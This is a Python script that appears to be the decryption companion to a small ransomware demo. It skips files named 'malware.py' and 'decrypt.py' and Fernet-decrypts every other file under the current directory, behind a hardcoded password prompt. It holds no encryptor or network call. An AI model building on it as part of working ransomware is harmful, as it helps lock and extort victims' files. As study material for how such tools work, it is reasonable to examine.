import os
import sys
from cryptography.fernet import Fernet


current_dir = os.getcwd()


def Lock(func):
    def wrapper(*args, **keyargs):
        count = 3
        while count > 0:
            psk: str = input('Password: ')
            if psk == 'noP@ssword':
                func(*args, **keyargs)
                break
            count -= 1
        if count == 0:
            sys.exit(1)
    return wrapper


def initializer(path):

    _all = os.walk(path)

    total_diretorys = 0
    total_files = 0

    all_files = list()

    for x in _all:
        path, directorys, files = x

        directory_length = len(directorys)
        files_length = len(files)
        total_diretorys += directory_length
        total_files += files_length

        if len(files) != 0:
            for file in files:
                with_path = path + '/' + file
                all_files.append(with_path)
    return all_files


def Decryptfiles(files):
    key = input('Enter your key to unlock files: ').encode()

    try:
        for file in files:
            if file.endswith('malware.py') or file.endswith('decrypt.py'):
                continue
            with open(file, 'rb') as thefile:
                content = thefile.read()
                decrypted = Fernet(key).decrypt(content)
            with open(file, 'wb') as thefile:
                thefile.write(decrypted)
        print("Decrypted")
    except Exception as error:
        print(error)


@Lock
def main():
    files = initializer(current_dir)
    Decryptfiles(files)


if __name__ == '__main__':
    main()
